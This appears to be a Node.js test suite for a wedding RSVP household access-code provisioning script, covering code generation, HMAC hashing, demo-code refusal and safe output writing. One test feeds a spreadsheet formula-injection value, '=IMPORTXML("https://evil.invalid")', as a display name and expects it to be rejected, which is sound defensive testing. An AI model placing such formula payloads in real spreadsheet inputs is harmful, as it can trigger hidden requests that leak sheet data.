import assert from 'node:assert/strict';
import { createHmac } from 'node:crypto';
import { mkdtemp, readFile, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import test from 'node:test';

import {
  ACCESS_CODE_ALPHABET,
  PUBLIC_DEMO_ACCESS_CODE,
  createHouseholdProvisioning,
  formatAccessCode,
  generateAccessCode,
  hashAccessCode,
  writeProvisioningFiles,
} from '../scripts/provision-household-code.mjs';

const ACCESS_SECRET = 'abcdefghijklmnopqrstuvwxyz0123456789_-ABCDEFGHIJKLMNOPQRSTUVWXYZ';
const FIXED_DATE = new Date('2026-08-29T12:00:00.000Z');

test('generator creates a formatted 20-character code from the approved alphabet', () => {
  let counter = 0;
  const code = generateAccessCode((maximum) => {
    assert.equal(maximum, ACCESS_CODE_ALPHABET.length);
    const selected = counter % maximum;
    counter += 1;
    return selected;
  });
  assert.equal(code.length, 20);
  assert.match(code, new RegExp(`^[${ACCESS_CODE_ALPHABET}]{20}$`));
  assert.match(formatAccessCode(code), /^[A-Z0-9]{5}(?:-[A-Z0-9]{5}){3}$/);
});

test('provisioning uses the same domain-separated hash and refuses the public demo code', () => {
  const accessCode = '2A3BC4D5EF6G7HJ8KMNP';
  const provisioning = createHouseholdProvisioning({
    householdId: 'hh_garcia_test',
    displayName: 'Familie Garcia',
    invitationVariant: 'day',
    maxGuests: 2,
    secret: ACCESS_SECRET,
    accessCode,
    now: () => FIXED_DATE,
  });
  const expectedHash = createHmac('sha256', ACCESS_SECRET)
    .update(`rsvp-access-code-v1\0${accessCode}`, 'utf8')
    .digest('base64url');

  assert.equal(provisioning.sheetRecord.accessCodeHash, expectedHash);
  assert.equal(provisioning.sheetRecord.tokenHash, '');
  assert.equal(provisioning.sheetRecord.mealChoiceRequired, true);
  assert.equal(provisioning.sheetRecord.currentRevision, 0);
  assert.equal(JSON.stringify(provisioning.sheetRecord).includes(accessCode), false);
  assert.equal(provisioning.deliveryRecord.accessCode, '2A3BC-4D5EF-6G7HJ-8KMNP');
  assert.equal(provisioning.deliveryRecord.sharedRsvpUrl, 'https://lisetteenbjarty.nl/#rsvp');

  assert.throws(
    () => hashAccessCode(PUBLIC_DEMO_ACCESS_CODE, ACCESS_SECRET),
    /public demo access code/,
  );
  assert.throws(
    () => createHouseholdProvisioning({
      householdId: 'hh_demo_forbidden',
      displayName: 'Niet opslaan',
      invitationVariant: 'evening',
      maxGuests: 1,
      secret: ACCESS_SECRET,
      accessCode: PUBLIC_DEMO_ACCESS_CODE,
      now: () => FIXED_DATE,
    }),
    /public demo access code/,
  );
  assert.throws(
    () => createHouseholdProvisioning({
      householdId: 'hh_formula_forbidden',
      displayName: '=IMPORTXML("https://evil.invalid")',
      invitationVariant: 'day',
      maxGuests: 1,
      secret: ACCESS_SECRET,
      accessCode: '2A3BC4D5EF6G7HJ8KMNP',
      now: () => FIXED_DATE,
    }),
    /safe characters/,
  );
});

test('sheet and private delivery outputs are outside the repository and never overwritten', async (context) => {
  const outputDirectory = await mkdtemp(join(tmpdir(), 'rsvp-household-code-'));
  context.after(async () => {
    const { rm } = await import('node:fs/promises');
    await rm(outputDirectory, { recursive: true, force: true });
  });
  const sheetOut = join(outputDirectory, 'sheet-record.json');
  const deliveryOut = join(outputDirectory, 'private-delivery.json');
  const provisioning = createHouseholdProvisioning({
    householdId: 'hh_output_test',
    displayName: 'Uitvoertest',
    invitationVariant: 'evening',
    maxGuests: 3,
    secret: ACCESS_SECRET,
    accessCode: '2A3BC4D5EF6G7HJ8KMNP',
    now: () => FIXED_DATE,
  });

  await writeProvisioningFiles({ sheetOut, deliveryOut, provisioning });
  const sheetSource = await readFile(sheetOut, 'utf8');
  const deliverySource = await readFile(deliveryOut, 'utf8');
  assert.equal(sheetSource.includes('2A3BC'), false);
  assert.equal(JSON.parse(sheetSource).mealChoiceRequired, false);
  assert.equal(JSON.parse(deliverySource).accessCode, '2A3BC-4D5EF-6G7HJ-8KMNP');

  await assert.rejects(
    writeProvisioningFiles({ sheetOut, deliveryOut, provisioning }),
    /exist/i,
  );

  const occupiedDelivery = join(outputDirectory, 'occupied.json');
  const rollbackSheet = join(outputDirectory, 'must-be-rolled-back.json');
  await writeFile(occupiedDelivery, 'owned by the user', 'utf8');
  await assert.rejects(
    writeProvisioningFiles({
      sheetOut: rollbackSheet,
      deliveryOut: occupiedDelivery,
      provisioning,
    }),
    /exist/i,
  );
  await assert.rejects(readFile(rollbackSheet, 'utf8'), /ENOENT/u);

  await assert.rejects(
    writeProvisioningFiles({
      sheetOut: resolve('forbidden-sheet.json'),
      deliveryOut: join(outputDirectory, 'unused.json'),
      provisioning,
    }),
    /outside the repository/,
  );
});
